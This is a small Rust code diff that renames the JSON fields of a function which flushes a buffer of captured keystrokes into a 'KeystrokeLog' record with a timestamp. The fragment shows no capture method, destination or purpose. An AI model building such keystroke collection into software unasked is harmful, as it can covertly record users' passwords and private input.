@@ -23,9 +23,9 @@ pub fn flush_keystroke_buffer() -> Option<Value> {
     let chunk = buf.join("");
     buf.clear();
     Some(json!({
-        "type":      "KeystrokeLog",
-        "chunk":     chunk,
-        "timestamp": chrono::Utc::now().to_rfc3339(),
+        "Type":      "KeystrokeLog",
+        "Details":   chunk,
+        "Timestamp": chrono::Utc::now().to_rfc3339(),
     }))
 }
 
